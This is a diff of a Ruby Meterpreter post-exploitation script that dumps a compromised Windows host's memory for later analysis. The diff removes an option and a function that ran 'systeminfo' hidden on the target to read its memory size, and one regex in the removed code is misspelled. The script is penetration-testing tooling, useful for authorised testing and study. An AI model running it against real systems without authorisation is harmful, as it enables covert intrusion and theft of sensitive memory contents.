@@ -1,13 +1,13 @@
 #!/usr/bin/env ruby
 #Meterpreter script for dumping target memory for later analisys. 
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.1.0 
+#Contributor sh4d0w4llk3r
+#Verion: 1.0.0 
 session = client
 host,port = session.tunnel_peer.split(':')
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
 		"-h" => [ false,  "Help menu."                        ],
-		"-c" => [ false,  "Check Memory Size on target. Image file will be of this size"],
 		"-d" => [ false,  "Dump Memory do not download"],
 		"-t" => [ true,  "Change the timeout for download default 5min. Specify timeout in seconds"]
 		)
@@ -78,26 +78,6 @@ def imgdown(session,tmp,imgname,logs,timeoutsec)
 			print_status("The following Error was encountered: #{e.class} #{e}")
 	end
 end
-#---------------------------------------------------------------------------------------------------------
-#Check target memory size
-def getmem(session)
-	memsize = ""
-	print_status("Checking the memory size of the target machine ......")
-	begin
-		r = session.sys.process.execute("systeminfo", nil, {'Hidden' => true, 'Channelized' => true})
-			while(d = r.channel.read)
-				if d =~ /Mémoire\sphisyque\stotale:\s*(\d*)\sMo/ 
-					memsize = /Mémoire\sphysique\stotale:\s*(\d*)\sMo/.match(d)
-				end
-			end
-		r.channel.close
-		r.close
-		print_status("The size of the image will be the same as the amount of Physical Memory")
-		print_status(memsize)
-	rescue::Exception => e
-		print_status("The following Error was encountered: #{e.class} #{e}")
-	end
-end
 
 ################## MAIN ##################
 # Parsing of Option
@@ -110,8 +90,6 @@ chk = 0
 			dwld = 1
 		when "-t"
 			timeoutsec = val
-		when "-c"
-			chk = 1
 		when "-h"
 			hlp = 1
 			print(
@@ -130,7 +108,6 @@ if (hlp == 0)
 		if (dwld == 0)
 			imgdown(session,tmp,imgname,logs,timeoutsec)
 		end
-	else
-		getmem(session)
+	
 	end
 end
